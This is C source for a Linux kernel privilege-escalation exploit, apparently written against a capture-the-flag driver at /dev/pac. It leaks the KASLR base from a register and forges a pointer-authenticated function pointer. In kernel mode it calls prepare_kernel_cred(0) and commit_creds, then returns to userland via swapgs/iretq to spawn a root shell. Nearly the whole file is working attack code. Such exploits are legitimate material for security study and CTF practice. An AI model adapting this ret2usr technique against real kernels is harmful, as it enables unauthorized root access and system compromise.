#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>

#define DEV_PATH "/dev/pac"

// ==================== global variables ====================
int fd;
unsigned long user_cs, user_ss, user_sp, user_rflags;
unsigned long sh, saved_rdx;
unsigned long nokaslr_base = 0xffffffff81000000;
unsigned long kaslr_base = 0xffffffff81000000;
unsigned long prepare_kernel_cred = 0xffffffff81098c10;
unsigned long commit_creds = 0xffffffff81098970;


// ==================== boilerplate/util ====================
void setup() {
    fd = open(DEV_PATH, O_RDWR);
}

void shell() {
    printf("[!] launching shell... ");
    if(getuid() == 0) {
        printf("as ROOT!\n");
        char *argv[] = { "/bin/sh", NULL };
        char *envp[] = { NULL };
        execve("/bin/sh", argv, envp);
    } else {
        printf("no root :(\n");
        exit(-1);
    }
}

void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] saved state");
}

unsigned long fix_addr(unsigned long addr) {
    return addr - nokaslr_base + kaslr_base;
}


// ==================== exploit functions ====================
void get_enc_hello() {
    char buf[0x100];
    read(fd, buf, 0x100);
    buf[54] = '\0';
    unsigned long enc_hello = (unsigned long)strtoul(buf+38, NULL, 16);
    printf("[+] enc_hello = 0x%16lx\n", enc_hello);
}

void privesc() {
    // rdx contains 0xffffffff8147b170 when this is called, so that's our leak
    __asm__(
        ".intel_syntax noprefix;"
        "mov saved_rdx, rdx;"
        ".att_syntax"
    );
    unsigned long offset = 0xffffffff8147b170 - nokaslr_base;
    kaslr_base = saved_rdx - offset;

    prepare_kernel_cred = fix_addr(prepare_kernel_cred);
    commit_creds = fix_addr(commit_creds);

    sh = (unsigned long)shell;
    __asm__ __volatile__(
        ".intel_syntax noprefix;"

        // prepare_kernel_cred(0)
        "movabs rax, prepare_kernel_cred;"
        "xor rdi, rdi;"
        "call rax;"

        // commit_creds with return value of prepare_kernel_cred call
        "mov rdi, rax;"
        "movabs rax, commit_creds;"
        "call rax;"

        // recover state to go back to userland
        "swapgs;"
        "mov rax, user_ss;"
        "push rax;"
        "mov rax, user_sp;"
        "push rax;"
        "mov rax, user_rflags;"
        "push rax;"
        "mov rax, user_cs;"
        "push rax;"

        "mov rax, sh;"
        "push rax;"

        "iretq;"
        ".att_syntax;"
    );
}

void win() {
    printf("[!] reading pac encryption of 0x%016lx: ", (unsigned long)privesc);
    fflush(stdout);
    char buf[19];
    read(0, buf, 19);
    buf[18] = '\0';
    unsigned long privesc_enc = (unsigned long)strtoul(buf, NULL, 16);

    printf("[+] read encrypted ptr 0x%16lx ", (unsigned long)privesc_enc);

    puts("[!] escalating privileges");
    unsigned long payload[1];
    unsigned long* p = payload;
    *p++ = (unsigned long)privesc_enc;
    write(fd, payload, sizeof(payload));
}


// ==================== go! ==================== 
int main() {
    setup();
    save_state();
    get_enc_hello();
    win();
}
